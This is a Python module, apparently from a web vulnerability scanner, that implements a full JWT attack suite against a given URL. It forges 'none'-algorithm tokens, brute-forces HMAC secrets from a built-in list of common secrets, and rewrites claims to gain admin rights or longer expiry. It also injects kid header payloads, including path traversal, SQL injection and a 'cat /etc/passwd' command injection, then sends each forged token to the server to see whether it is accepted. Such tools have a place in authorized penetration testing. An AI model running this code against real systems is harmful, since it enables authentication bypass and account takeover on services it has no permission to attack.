"""
cyberm4fia-scanner - JWT Attack Suite
Full JWT exploitation: algorithm confusion, none bypass, brute force,
claim tampering, expiry manipulation, kid injection.
"""

import sys
import os
import json
import hmac
import hashlib
import base64
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.colors import log_info, log_success, log_warning
from utils.request import smart_request


# ─────────────────────────────────────────────────────
# JWT Helpers
# ─────────────────────────────────────────────────────
def _b64_decode(data):
    """Base64url decode."""
    data += "=" * (4 - len(data) % 4)
    return base64.urlsafe_b64decode(data)


def _b64_encode(data):
    """Base64url encode (no padding)."""
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _parse_jwt(token):
    """Parse a JWT token into header, payload, signature."""
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None

        header = json.loads(_b64_decode(parts[0]))
        payload = json.loads(_b64_decode(parts[1]))
        signature = parts[2]

        return {
            "header": header,
            "payload": payload,
            "signature": signature,
            "raw_parts": parts,
        }
    except Exception:
        return None


def _sign_hs256(header, payload, secret):
    """Sign a JWT with HS256."""
    header_b64 = _b64_encode(json.dumps(header, separators=(",", ":")))
    payload_b64 = _b64_encode(json.dumps(payload, separators=(",", ":")))
    message = f"{header_b64}.{payload_b64}"
    sig = hmac.new(
        secret.encode() if isinstance(secret, str) else secret,
        message.encode(),
        hashlib.sha256,
    ).digest()
    sig_b64 = _b64_encode(sig)
    return f"{message}.{sig_b64}"


def _find_jwt_tokens(text):
    """Find JWT tokens in text (headers, cookies, body)."""
    import re

    pattern = r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*"
    return re.findall(pattern, text)


# ─────────────────────────────────────────────────────
# Attack 1: Algorithm None
# ─────────────────────────────────────────────────────
def attack_alg_none(parsed_jwt):
    """
    Try setting algorithm to 'none' — removes signature verification.
    If server accepts: any token is valid = full auth bypass.
    """
    findings = []
    none_variants = ["none", "None", "NONE", "nOnE"]

    for alg in none_variants:
        header = parsed_jwt["header"].copy()
        header["alg"] = alg

        header_b64 = _b64_encode(json.dumps(header, separators=(",", ":")))
        payload_b64 = parsed_jwt["raw_parts"][1]

        # Token with no signature
        forged = f"{header_b64}.{payload_b64}."
        findings.append(
            {
                "attack": "Algorithm None",
                "variant": alg,
                "forged_token": forged,
                "description": f"JWT with alg={alg} and empty signature",
            }
        )

    return findings


# ─────────────────────────────────────────────────────
# Attack 2: HS256 Brute Force
# ─────────────────────────────────────────────────────
COMMON_SECRETS = [
    "secret",
    "password",
    "123456",
    "admin",
    "key",
    "jwt_secret",
    "changeme",
    "default",
    "test",
    "supersecret",
    "your-256-bit-secret",
    "mysecretkey",
    "s3cr3t",
    "passw0rd",
    "qwerty",
    "abc123",
    "iloveyou",
    "letmein",
    "welcome",
    "monkey",
    "dragon",
    "master",
    "login",
    "access",
    "hello",
    "charlie",
    "root",
    "toor",
    "jwt",
    "token",
    "auth",
    "app",
    "development",
    "production",
    "staging",
    "HS256",
    "RS256",
    "secret123",
    "my-secret-key",
    "my_secret_key",
    "jwt-secret",
    "jwt_key",
    "api_key",
    "api-secret",
    "app-secret",
    "app_secret",
    "a]àb@∞c!d#e$f%g^h&i*j(k)l-m_n+o",
    "",
    " ",
]


def attack_brute_force(parsed_jwt, wordlist=None):
    """
    Brute force the HMAC secret used to sign the JWT.
    If found: attacker can forge any token.
    """
    if parsed_jwt["header"].get("alg", "").startswith("RS"):
        return []  # RS256 uses public/private key, not brute-forceable

    secrets_to_try = wordlist or COMMON_SECRETS
    header_b64 = parsed_jwt["raw_parts"][0]
    payload_b64 = parsed_jwt["raw_parts"][1]
    original_sig = parsed_jwt["raw_parts"][2]
    message = f"{header_b64}.{payload_b64}".encode()

    findings = []

    for secret in secrets_to_try:
        try:
            secret_bytes = secret.encode() if isinstance(secret, str) else secret
            computed = hmac.new(secret_bytes, message, hashlib.sha256).digest()
            computed_b64 = _b64_encode(computed)

            if computed_b64 == original_sig:
                findings.append(
                    {
                        "attack": "Secret Brute Force",
                        "secret": secret,
                        "description": f"JWT secret cracked: '{secret}' — attacker can forge any token!",
                        "severity": "CRITICAL",
                    }
                )
                break
        except Exception:
            pass

    return findings


# ─────────────────────────────────────────────────────
# Attack 3: Claim Tampering
# ─────────────────────────────────────────────────────
def attack_claim_tamper(parsed_jwt, cracked_secret=None):
    """
    Modify JWT claims to escalate privileges.
    If we cracked the secret, we can sign the forged token.
    """
    findings = []
    payload = parsed_jwt["payload"].copy()

    # Define tampering strategies
    tamper_rules = [
        # Role escalation
        {"field": "role", "values": ["admin", "administrator", "root", "superuser"]},
        {"field": "roles", "values": [["admin"], ["administrator"]]},
        {"field": "is_admin", "values": [True, 1, "true"]},
        {"field": "isAdmin", "values": [True, 1]},
        {"field": "admin", "values": [True, 1]},
        {"field": "is_staff", "values": [True]},
        {"field": "user_type", "values": ["admin", "staff"]},
        {"field": "privilege", "values": ["admin", "root"]},
        {"field": "group", "values": ["admin", "administrators"]},
        # User ID manipulation (IDOR)
        {"field": "sub", "values": ["1", "0", "admin"]},
        {"field": "user_id", "values": [1, 0]},
        {"field": "uid", "values": [1, 0]},
    ]

    for rule in tamper_rules:
        field = rule["field"]
        if field in payload:
            original = payload[field]
            for new_value in rule["values"]:
                if new_value == original:
                    continue

                tampered_payload = payload.copy()
                tampered_payload[field] = new_value

                forged_token = None
                if cracked_secret is not None:
                    forged_token = _sign_hs256(
                        parsed_jwt["header"], tampered_payload, cracked_secret
                    )

                findings.append(
                    {
                        "attack": "Claim Tampering",
                        "field": field,
                        "original": str(original),
                        "tampered": str(new_value),
                        "forged_token": forged_token,
                        "description": f"Changed {field}: {original} → {new_value}",
                    }
                )

    # Expiry manipulation
    if "exp" in payload:
        tampered_payload = payload.copy()
        tampered_payload["exp"] = int(time.time()) + (365 * 24 * 3600)  # 1 year
        forged_token = None
        if cracked_secret:
            forged_token = _sign_hs256(
                parsed_jwt["header"], tampered_payload, cracked_secret
            )
        findings.append(
            {
                "attack": "Expiry Extension",
                "field": "exp",
                "original": str(payload["exp"]),
                "tampered": str(tampered_payload["exp"]),
                "forged_token": forged_token,
                "description": "Extended token expiry by 1 year",
            }
        )

    return findings


# ─────────────────────────────────────────────────────
# Attack 4: KID Injection
# ─────────────────────────────────────────────────────
def attack_kid_injection(parsed_jwt):
    """
    Inject malicious 'kid' (Key ID) header parameter.
    Can lead to: directory traversal, SQL injection, command injection.
    """
    findings = []

    kid_payloads = [
        # Directory traversal — use /dev/null as key (empty = no signature check)
        ("Path Traversal", "../../../../../../dev/null"),
        ("Path Traversal", "/dev/null"),
        # SQL injection in kid
        ("SQL Injection", "' UNION SELECT 'secret' -- "),
        ("SQL Injection", "' OR '1'='1"),
        # Command injection
        ("Command Injection", "| cat /etc/passwd"),
    ]

    for attack_type, kid_value in kid_payloads:
        header = parsed_jwt["header"].copy()
        header["kid"] = kid_value

        header_b64 = _b64_encode(json.dumps(header, separators=(",", ":")))
        payload_b64 = parsed_jwt["raw_parts"][1]

        # For /dev/null, sign with empty key
        if "null" in kid_value:
            try:
                message = f"{header_b64}.{payload_b64}".encode()
                sig = hmac.new(b"", message, hashlib.sha256).digest()
                sig_b64 = _b64_encode(sig)
                forged = f"{header_b64}.{payload_b64}.{sig_b64}"
            except Exception:
                forged = f"{header_b64}.{payload_b64}."
        else:
            forged = f"{header_b64}.{payload_b64}."

        findings.append(
            {
                "attack": f"KID {attack_type}",
                "kid": kid_value,
                "forged_token": forged,
                "description": f"Injected kid: {kid_value}",
            }
        )

    return findings


# ─────────────────────────────────────────────────────
# Token Verification (test if forged tokens are accepted)
# ─────────────────────────────────────────────────────
def _test_forged_token(url, token, original_response, delay=0):
    """Test if a forged JWT token is accepted by the server."""
    try:
        # Try as Authorization header
        headers = {"Authorization": f"Bearer {token}"}
        resp = smart_request("get", url, headers=headers, delay=delay, timeout=5)

        if resp.status_code in (200, 201) and resp.status_code != 401:
            return {
                "accepted": True,
                "location": "Authorization header",
                "status": resp.status_code,
            }
    except Exception:
        pass

    return {"accepted": False}


# ─────────────────────────────────────────────────────
# Main Scanner
# ─────────────────────────────────────────────────────
def scan_jwt(url, delay=0, cookie=None):
    """
    Main JWT Attack Suite entry point.
    Scans for JWT tokens and runs all attacks.
    """
    log_info("Starting JWT Attack Suite...")

    all_findings = []

    # Step 1: Find JWT tokens
    tokens = set()

    # Check response headers and body
    try:
        resp = smart_request("get", url, delay=delay, timeout=10)
        # Search in response body
        body_tokens = _find_jwt_tokens(resp.text)
        tokens.update(body_tokens)

        # Search in response headers
        for header_name in ["authorization", "x-auth-token", "x-access-token", "token"]:
            header_val = resp.headers.get(header_name, "")
            if header_val:
                header_tokens = _find_jwt_tokens(header_val)
                tokens.update(header_tokens)

        # Search in Set-Cookie
        for cookie_header in (
            resp.headers.getlist("Set-Cookie")
            if hasattr(resp.headers, "getlist")
            else [resp.headers.get("Set-Cookie", "")]
        ):
            if cookie_header:
                cookie_tokens = _find_jwt_tokens(cookie_header)
                tokens.update(cookie_tokens)

    except Exception as e:
        log_warning(f"Failed to fetch URL: {e}")

    # Check provided cookie
    if cookie:
        cookie_tokens = _find_jwt_tokens(cookie)
        tokens.update(cookie_tokens)

    if not tokens:
        log_info("No JWT tokens found in response or cookies.")
        return all_findings

    log_success(f"Found {len(tokens)} JWT token(s)")

    for token in tokens:
        parsed = _parse_jwt(token)
        if not parsed:
            continue

        alg = parsed["header"].get("alg", "Unknown")
        log_info(f"Analyzing JWT (alg={alg}):")
        log_info(f"  Header: {json.dumps(parsed['header'])}")
        log_info(f"  Payload: {json.dumps(parsed['payload'])}")

        # Check for obviously weak config
        if alg.lower() == "none":
            all_findings.append(
                {
                    "type": "JWT Vulnerability",
                    "vuln": "Algorithm set to 'none'",
                    "severity": "CRITICAL",
                    "url": url,
                    "description": "JWT already uses algorithm 'none' — no signature verification!",
                }
            )

        # Attack 1: Algorithm None
        log_info("  → Testing Algorithm None bypass...")
        none_results = attack_alg_none(parsed)
        for r in none_results:
            verified = _test_forged_token(url, r["forged_token"], None, delay)
            if verified["accepted"]:
                all_findings.append(
                    {
                        "type": "JWT Vulnerability",
                        "vuln": "Algorithm None Bypass",
                        "severity": "CRITICAL",
                        "url": url,
                        "variant": r["variant"],
                        "forged_token": r["forged_token"][:50] + "...",
                        "description": f"Server accepts JWT with alg={r['variant']}! Full auth bypass possible.",
                    }
                )
                log_success(
                    f"🔥 [CRITICAL] JWT alg=none bypass works! ({r['variant']})"
                )
                break

        # Attack 2: Brute Force
        if alg.startswith("HS"):
            log_info("  → Brute forcing JWT secret...")
            brute_results = attack_brute_force(parsed)
            cracked_secret = None
            for r in brute_results:
                cracked_secret = r["secret"]
                all_findings.append(
                    {
                        "type": "JWT Vulnerability",
                        "vuln": "Weak Secret",
                        "severity": "CRITICAL",
                        "url": url,
                        "secret": cracked_secret,
                        "description": r["description"],
                    }
                )
                log_success(f'🔥 [CRITICAL] JWT secret cracked: "{cracked_secret}"')

            # Attack 3: Claim Tampering (only useful if we have the secret)
            log_info("  → Testing claim tampering...")
            tamper_results = attack_claim_tamper(parsed, cracked_secret)
            for r in tamper_results:
                finding = {
                    "type": "JWT Vulnerability",
                    "vuln": r["attack"],
                    "severity": "HIGH" if cracked_secret else "INFO",
                    "url": url,
                    "description": r["description"],
                }
                if r.get("forged_token"):
                    finding["forged_token"] = r["forged_token"][:50] + "..."
                    # Verify forged token
                    verified = _test_forged_token(url, r["forged_token"], None, delay)
                    if verified["accepted"]:
                        finding["severity"] = "CRITICAL"
                        finding["description"] += " → SERVER ACCEPTED FORGED TOKEN!"
                        log_success(
                            f"🔥 [CRITICAL] Forged JWT accepted! {r['description']}"
                        )

                all_findings.append(finding)

        # Attack 4: KID Injection
        log_info("  → Testing KID injection...")
        kid_results = attack_kid_injection(parsed)
        for r in kid_results:
            verified = _test_forged_token(url, r["forged_token"], None, delay)
            if verified["accepted"]:
                all_findings.append(
                    {
                        "type": "JWT Vulnerability",
                        "vuln": r["attack"],
                        "severity": "CRITICAL",
                        "url": url,
                        "kid": r["kid"],
                        "description": f"Server accepted forged token with kid={r['kid']}",
                    }
                )
                log_success(f"🔥 [CRITICAL] KID injection works: {r['kid']}")

    log_success(f"JWT scan complete. {len(all_findings)} finding(s).")
    return all_findings
